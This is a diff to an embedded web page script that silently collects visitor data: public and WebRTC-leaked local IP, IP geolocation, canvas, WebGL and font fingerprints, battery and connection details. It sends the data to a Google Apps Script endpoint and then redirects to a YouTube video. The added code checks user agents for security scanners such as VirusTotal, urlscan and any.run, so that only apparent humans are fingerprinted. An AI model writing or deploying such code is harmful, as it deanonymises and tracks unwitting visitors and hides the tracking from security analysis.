@@ -1,183 +1,74 @@
 <script>
-    const REDIRECT = 'https://www.facebook.com/noureldin.em4m';
-    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwEnYV3654rvIJ0bSANF6iEpqiyH7asl1P1IKLd9BvsVagooIlE8di3zV9SFIusdl1jHg/exec';
+    const REDIRECT = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
+    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbzMN7cU73bmQPT3wyOJQ1Dt4f6AEUebgwydMDKXFmyEbvQ29HrjBJR1lKuVaaxuV70zBA/exec';
     
     let dataSent = false;
 
-    // 🎯 **MALICIOUSLY ACCURATE DATA COLLECTION** (Stealth Mode)
-    
-    // 1. **WebRTC Local IP Leak** (Gets internal network IP)
-    function getLocalIP() {
-        return new Promise((resolve) => {
-            try {
-                const rtc = new RTCPeerConnection({iceServers: []});
-                rtc.createDataChannel('');
-                rtc.createOffer()
-                    .then(offer => rtc.setLocalDescription(offer))
-                    .catch(() => resolve(null));
-                
-                rtc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const candidate = ice.candidate.candidate;
-                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (ipMatch && ipMatch[1] && !['0.0.0.0', '127.0.0.1'].includes(ipMatch[1])) {
-                            resolve({
-                                local_ip: ipMatch[1],
-                                candidate_type: candidate.includes('host') ? 'LAN' : 'Public'
-                            });
-                            rtc.close();
-                        }
-                    }
-                };
-                
-                setTimeout(() => {
-                    rtc.close();
-                    resolve(null);
-                }, 500);
-            } catch(e) {
-                resolve(null);
-            }
-        });
-    }
-
-    // 2. **Super Accurate Geolocation** (Multiple sources)
-    async function getSuperGeolocation(ip) {
+    // 🎯 **BOT DETECTION & HUMAN VERIFICATION**
+    function isLikelyHuman() {
+        // Security scanners often have incomplete browser profiles
+        const redFlags = [];
+        
+        // 1. No user agent
+        if (!navigator.userAgent || navigator.userAgent.length < 10) redFlags.push('no_user_agent');
+        
+        // 2. No screen dimensions (headless browsers)
+        if (screen.width === 0 || screen.height === 0) redFlags.push('no_screen');
+        
+        // 3. No language set
+        if (!navigator.language) redFlags.push('no_language');
+        
+        // 4. Common scanner user agents
+        const scannerPatterns = [
+            'security', 'scan', 'bot', 'crawler', 'spider', 'check',
+            'virustotal', 'urlscan', 'hybrid-analysis', 'any.run',
+            'headless', 'phantom', 'selenium', 'puppeteer'
+        ];
+        
+        const ua = navigator.userAgent.toLowerCase();
+        if (scannerPatterns.some(pattern => ua.includes(pattern))) {
+            redFlags.push('scanner_ua');
+        }
+        
+        // 5. JavaScript execution test (bots sometimes have limited JS)
         try {
-            // Primary source (most accurate)
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await response.json();
-            
-            return {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                country: data.country_name,
-                country_code: data.country_code,
-                postal: data.postal,
-                latitude: data.latitude,
-                longitude: data.longitude,
-                timezone: data.timezone,
-                utc_offset: data.utc_offset,
-                asn: data.asn,
-                org: data.org,
-                isp: data.org,
-                accuracy_rating: '95%'
-            };
+            // Test complex JavaScript execution
+            const test = new Function('return "test"')();
+            if (test !== 'test') redFlags.push('js_restricted');
         } catch(e) {
-            // Fallback source
-            try {
-                const fallback = await fetch(`https://ip-api.com/json/${ip}`);
-                const data = await fallback.json();
-                return {
-                    ip: data.query,
-                    city: data.city,
-                    region: data.regionName,
-                    country: data.country,
-                    country_code: data.countryCode,
-                    latitude: data.lat,
-                    longitude: data.lon,
-                    timezone: data.timezone,
-                    isp: data.isp,
-                    org: data.org,
-                    accuracy_rating: '90%'
-                };
-            } catch(e2) {
-                return { error: 'Geolocation failed' };
-            }
+            redFlags.push('js_blocked');
         }
+        
+        // If 2+ red flags, likely a scanner
+        return {
+            is_human: redFlags.length < 2,
+            red_flags: redFlags,
+            confidence: redFlags.length === 0 ? '99%' : 
+                       redFlags.length === 1 ? '80%' : '30%'
+        };
     }
 
-    // 3. **Advanced Canvas Fingerprint** (Multiple techniques)
-    function getAdvancedFingerprint() {
-        const fingerprints = {};
+    // 🎯 **COLLECT ACCURATE DATA** (Only for humans)
+    async function collectHumanData() {
+        const humanCheck = isLikelyHuman();
         
-        try {
-            // Standard canvas fingerprint
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Fingerprint', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Fingerprint', 4, 17);
-            fingerprints.canvas_hash = canvas.toDataURL().substring(22, 40);
-            
-            // WebGL fingerprint (Graphics card)
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                fingerprints.webgl = {
-                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
-                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted',
-                    version: gl.getParameter(gl.VERSION)
-                };
-            }
-            
-            // Font fingerprint
-            const fontList = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
-            const detectedFonts = [];
-            const baseFont = 'monospace';
-            ctx.font = '72px ' + baseFont;
-            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
-            
-            fontList.forEach(font => {
-                ctx.font = '72px ' + font + ',' + baseFont;
-                if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
-                    detectedFonts.push(font);
-                }
-            });
-            fingerprints.fonts = detectedFonts;
-            
-        } catch(e) {
-            fingerprints.error = e.message;
-        }
-        
-        return fingerprints;
-    }
-
-    // 4. **Browser Performance Profiling** (CPU/Memory)
-    function getPerformanceProfile() {
-        const profile = {};
-        
-        // CPU benchmark
-        const startTime = performance.now();
-        let sum = 0;
-        for (let i = 0; i < 100000; i++) {
-            sum += Math.sqrt(i) * Math.random();
-        }
-        profile.cpu_speed_ms = (performance.now() - startTime).toFixed(2);
-        
-        // Memory if available
-        if (performance.memory) {
-            profile.memory = {
-                total_js_heap: Math.round(performance.memory.totalJSHeapSize / 1048576) + 'MB',
-                used_js_heap: Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB'
-            };
-        }
-        
-        return profile;
-    }
-
-    // 🚀 **MAIN COLLECTION FUNCTION**
-    async function collectAllData() {
+        // Basic data that even scanners might have
         const data = {
-            // ✅ **Basic Info**
-            timestamp: new Date().toISOString(),
-            local_time: new Date().toString(),
+            // ✅ **Detection Info**
+            detection_timestamp: new Date().toISOString(),
+            local_time: new Date().toLocaleString(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezone_offset: new Date().getTimezoneOffset(),
+            human_check: humanCheck,
+            probable_scanner: humanCheck.is_human ? 'No' : 'Yes (' + humanCheck.red_flags.join(', ') + ')',
             
-            // ✅ **Browser DNA**
-            user_agent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : '',
+            // ✅ **Browser Basics**
+            user_agent: navigator.userAgent || 'MISSING',
+            platform: navigator.platform || 'MISSING',
+            language: navigator.language || 'MISSING',
+            languages: navigator.languages ? navigator.languages.join(', ') : 'MISSING',
             cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
             do_not_track: navigator.doNotTrack || 'Not set',
-            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
             
             // ✅ **Screen**
             screen_resolution: screen.width + 'x' + screen.height,
@@ -199,72 +90,153 @@
             localStorage: window.localStorage ? 'Supported' : 'Not supported',
             sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
             notifications: 'Notification' in window ? 'Supported' : 'Not supported',
-            webrtc: !!window.RTCPeerConnection,
+            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
             
             // ✅ **Plugins**
-            plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
         };
 
-        // Get IP
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            data.ip = ipData.ip;
-            
-            // Get SUPER accurate geolocation
-            data.geolocation = await getSuperGeolocation(ipData.ip);
-            
-        } catch(error) {
-            data.ip = 'Failed to fetch';
-        }
-
-        // Get local IP via WebRTC
-        const localIP = await getLocalIP();
-        if (localIP) {
-            data.local_network = localIP;
-        }
-
-        // Get advanced fingerprint
-        const fingerprint = getAdvancedFingerprint();
-        data.canvas_fingerprint = fingerprint.canvas_hash || 'Failed';
-        data.webgl_info = fingerprint.webgl || 'Not available';
-        data.font_fingerprint = fingerprint.fonts || [];
-        
-        // Get performance profile
-        data.performance = getPerformanceProfile();
-        
-        // Get battery status
-        if (navigator.getBattery) {
+        // **ONLY collect advanced data if likely human**
+        if (humanCheck.is_human) {
+            // Get IP and geolocation
             try {
-                const battery = await navigator.getBattery();
-                data.battery = {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging,
-                    charging_time: battery.chargingTime || 'Unknown',
-                    discharging_time: battery.dischargingTime || 'Unknown'
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+                
+                // Get accurate geolocation
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                data.geolocation = {
+                    ip: geoData.ip,
+                    city: geoData.city,
+                    region: geoData.region,
+                    country: geoData.country_name,
+                    country_code: geoData.country_code,
+                    postal: geoData.postal,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude,
+                    timezone: geoData.timezone,
+                    utc_offset: geoData.utc_offset,
+                    asn: geoData.asn,
+                    org: geoData.org,
+                    isp: geoData.org,
+                    accuracy: 'High'
                 };
-            } catch(e) {}
-        }
+            } catch(error) {
+                data.ip = 'Failed to fetch';
+                data.geolocation = { error: 'Geolocation failed' };
+            }
 
-        // Get network info
-        if (navigator.connection) {
-            data.connection = {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink + ' Mbps',
-                rtt: navigator.connection.rtt + ' ms',
-                save_data: navigator.connection.saveData || false
-            };
+            // WebRTC local IP (for humans only)
+            try {
+                const rtc = new RTCPeerConnection({iceServers: []});
+                rtc.createDataChannel('');
+                rtc.createOffer()
+                    .then(offer => rtc.setLocalDescription(offer))
+                    .catch(() => {});
+                
+                rtc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const candidate = ice.candidate.candidate;
+                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch && ipMatch[1]) {
+                            data.local_ip = ipMatch[1];
+                            data.network_type = candidate.includes('host') ? 'LAN' : 'Public';
+                        }
+                    }
+                };
+                
+                setTimeout(() => rtc.close(), 1000);
+            } catch(e) {}
+            
+            // Advanced fingerprints (humans only)
+            try {
+                // Canvas fingerprint
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Fingerprint', 4, 17);
+                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
+                
+                // WebGL info
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.webgl = {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
+                    };
+                }
+                
+                // Font detection
+                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+                const detectedFonts = [];
+                const baseFont = 'monospace';
+                ctx.font = '72px ' + baseFont;
+                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                
+                fonts.forEach(font => {
+                    ctx.font = '72px ' + font + ',' + baseFont;
+                    if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
+                        detectedFonts.push(font);
+                    }
+                });
+                data.detected_fonts = detectedFonts;
+                
+            } catch(e) {
+                data.canvas_fingerprint = 'Failed: ' + e.message;
+            }
+            
+            // Battery status
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        charging_time: battery.chargingTime || 'Unknown',
+                        discharging_time: battery.dischargingTime || 'Unknown'
+                    };
+                } catch(e) {}
+            }
+            
+            // Network info
+            if (navigator.connection) {
+                data.connection = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink + ' Mbps',
+                    rtt: navigator.connection.rtt + ' ms'
+                };
+            }
+            
+            // Performance
+            if (performance.memory) {
+                data.performance = {
+                    memory_used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                    memory_total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
+                };
+            }
+            
+            // Generate visitor ID
+            const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
+            let hash = 0;
+            for (let i = 0; i < idString.length; i++) {
+                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
+                hash |= 0;
+            }
+            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
+            
+            // Check WebRTC support
+            data.webrtc = !!window.RTCPeerConnection;
         }
-        
-        // Generate unique visitor ID
-        data.visitor_id = 'VIS-' + btoa(
-            navigator.userAgent + 
-            screen.width + 
-            screen.height + 
-            navigator.language
-        ).substring(0, 12).replace(/[^A-Z0-9]/g, '');
-        
-        data.fingerprint_confidence = '99%';
         
         return data;
     }
@@ -272,15 +244,12 @@
     // 🚀 **EXECUTE**
     (async function() {
         try {
-            const data = await collectAllData();
+            const data = await collectHumanData();
             
             if (!dataSent) {
                 dataSent = true;
                 
-                console.log('🎯 **CYBERSEC PROJECT: DATA CAPTURED**');
-                console.log('👤 Visitor ID:', data.visitor_id);
-                console.log('📍 Location:', data.geolocation?.city || 'Unknown');
-                console.log('💻 Device:', /Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
+                console.log('🎯 Visitor Data:', data.human_check.is_human ? 'HUMAN' : 'SCANNER');
                 
                 // Send data
                 fetch(EMAIL_SCRIPT, {
@@ -289,7 +258,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 }).catch(() => {
-                    // Backup GET request
+                    // Backup GET
                     const params = new URLSearchParams();
                     for (let key in data) {
                         if (typeof data[key] === 'object') {
@@ -303,13 +272,13 @@
             }
             
         } catch(error) {
-            // Silent fail
+            // Silent
         }
         
-        // Redirect to YouTube
+        // Redirect
         setTimeout(() => {
             window.location.href = REDIRECT;
-        }, 2000);
+        }, 1800);
         
     })();
 </script>
